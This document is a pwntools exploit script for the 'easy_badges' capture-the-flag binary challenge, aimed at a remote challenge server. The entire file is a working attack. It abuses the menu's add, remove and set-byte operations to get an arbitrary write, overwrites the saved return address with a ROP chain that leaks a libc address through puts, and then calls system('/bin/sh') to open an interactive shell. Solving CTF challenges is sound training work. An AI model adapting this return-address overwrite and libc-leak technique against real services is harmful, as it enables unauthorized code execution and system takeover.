from pwn import *

logging.disable()

# r = process("./easy_badges")
r = remote("easybadges.challs.nazionale.olicyber.it", 31500)
elf = context.binary = ELF("./easy_badges")
libc = ELF("./libc6_2.39-0ubuntu8.4_amd64.so")
libc.address = 0

def finish():
    r.sendlineafter(b"> : ", b"6")

def add(len):
    r.sendlineafter(b"> : ", b"1")
    r.sendlineafter(b"> Steps: ", f"{len}".encode())

def rem(len):
    r.sendlineafter(b"> : ", b"2")
    r.sendlineafter(b"> Steps: ", f"{len}".encode())

def set(where, what):
    add(where)

    r.sendlineafter(b"> : ", b"4")
    r.sendlineafter(b"> Byte: ", f"{what}".encode())

    rem(where)

def set_qword(start, what):
    for i in range(8):
        set(start+i, (what>>(i*8)) & 0xff)


ret = 0x000000000040101a
pop_rdi   = 0x0000000000401249
puts_got  = 0x403fb0
puts_plt  = elf.plt["puts"]

start_ret_edit = 88

set_qword(start_ret_edit, pop_rdi)
set_qword(start_ret_edit+8, 0x403fe8)
set_qword(start_ret_edit+16, puts_plt)

set_qword(start_ret_edit+24, 0x40162c)

finish()

r.recvline()
puts_addr = int(r.recvline().strip()[::-1].hex(), 16)

libc_base = puts_addr - libc.symbols["exit"]
print("libc_base: " + hex(libc_base))

system = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

start_ret_edit = 120
set_qword(start_ret_edit, pop_rdi)
set_qword(start_ret_edit+8, bin_sh)
set_qword(start_ret_edit+16, ret)
set_qword(start_ret_edit+24, system)

finish()

r.interactive()

# puts : be0 (0x403fb0)
# exit: ba0 (0x403fe8)